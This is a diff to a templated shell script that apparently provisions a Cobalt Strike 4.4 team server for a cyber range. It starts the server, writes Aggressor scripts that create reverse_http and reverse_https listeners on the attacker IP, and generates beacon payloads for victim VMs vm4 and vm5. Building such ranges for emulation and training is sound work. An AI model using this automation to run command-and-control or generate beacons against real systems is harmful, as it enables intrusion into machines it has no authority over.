@@ -4,7 +4,7 @@ set -x
 
 # Extract CS and start team server
 rm -rf Cobaltstrike-4.4
-unzip /vagrant/cobaltstrike-4.4.zip
+unzip /vagrant/{{ dependencies['cs_installer'] }}
 cd Cobaltstrike-4.4
 chmod 755 teamserver agscript
 
@@ -15,7 +15,7 @@ nc -zv localhost 50050 && echo 'team server start successfully!'
 
 # vm4: reverse_http on Cobalt Strike
 
-lfn=/vagrant/{{ range_root }}/{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}
+lfn=/vagrant/{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}
 cat << EOF > $lfn.cna
 on ready {
   listener_create_ext("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm4']['payload'] }}", %(host => "{{ attacker['ip'] }}", port => {{ attacker['team_server_port'] }}, beacons => "{{ attacker['ip'] }}"));
@@ -40,13 +40,13 @@ on beacon_output {
 EOF
 
 echo "Listener starting ..."
-nohup ./agscript {{ attacker['ip'] }} 50050 monlis {{ attacker['team_server_pwd']}} $lfn.cna &> $lfn.log &
+nohup ./agscript {{ attacker['ip'] }} 50050 lvm4 {{ attacker['team_server_pwd']}} $lfn.cna &> $lfn.log &
 sleep 10
 cat $lfn.log
 echo -n "agscript PID: " && pgrep agscript
 
-bfn=/vagrant/{{ range_root }}/{{ victim['vm4']['beacon_file'] }}
-cat << 'EOF' > $bfn.cna
+bfn=/vagrant/{{ victim['vm4']['beacon_file'] }}
+cat << EOF > $bfn.cna
 on ready {
   println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
   \$data = artifact_payload("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm4']['beacon_format'] }}", "{{ victim['vm4']['arch'] }}", "process", "None");
@@ -59,13 +59,13 @@ on ready {
 EOF
 
 echo "Generating beacon ..."
-./agscript {{ attacker['ip'] }} 50050 vm4 {{ attacker['team_server_pwd']}} $bfn.cna &> $bfn.log
+nohup ./agscript {{ attacker['ip'] }} 50050 bvm4 {{ attacker['team_server_pwd']}} $bfn.cna &> $bfn.log &
 sleep 5
 cat $bfn.log
 
 # vm5: reverse_https on Cobalt Strike
 
-lfn=/vagrant/{{ range_root }}/{{ attacker['listener']['cobaltstrike']['rhttps']['name'] }}
+lfn=/vagrant/{{ attacker['listener']['cobaltstrike']['rhttps']['name'] }}
 cat << EOF > $lfn.cna
 on ready {
   listener_create_ext("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm5']['payload'] }}", %(host => "{{ attacker['ip'] }}", port => {{ attacker['team_server_port'] }}, beacons => "{{ attacker['ip'] }}"));
@@ -90,13 +90,13 @@ on beacon_output {
 EOF
 
 echo "Listener starting ..."
-nohup ./agscript {{ attacker['ip'] }} 50050 monlis {{ attacker['team_server_pwd']}} $lfn.cna &> $lfn.log &
+nohup ./agscript {{ attacker['ip'] }} 50050 lvm5 {{ attacker['team_server_pwd']}} $lfn.cna &> $lfn.log &
 sleep 10
 cat $lfn.log
 echo -n "agscript PID: " && pgrep agscript
 
-bfn=/vagrant/{{ range_root }}/{{ victim['vm5']['beacon_file'] }}
-cat << 'EOF' > $bfn.cna
+bfn=/vagrant/{{ victim['vm5']['beacon_file'] }}
+cat << EOF > $bfn.cna
 on ready {
   println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
   \$data = artifact_payload("{{ attacker['listener']['cobaltstrike']['rhttp']['name'] }}", "{{ victim['vm5']['beacon_format'] }}", "{{ victim['vm5']['arch'] }}", "process", "None");
@@ -109,8 +109,9 @@ on ready {
 EOF
 
 echo "Generating beacon ..."
-./agscript {{ attacker['ip'] }} 50050 vm5 {{ attacker['team_server_pwd']}} $bfn.cna &> $bfn.log
+nohup ./agscript {{ attacker['ip'] }} 50050 bvm5 {{ attacker['team_server_pwd']}} $bfn.cna &> $bfn.log &
 sleep 5
 cat $bfn.log
 
+echo -e "\nCobalt Strike provision completed!\n"
 
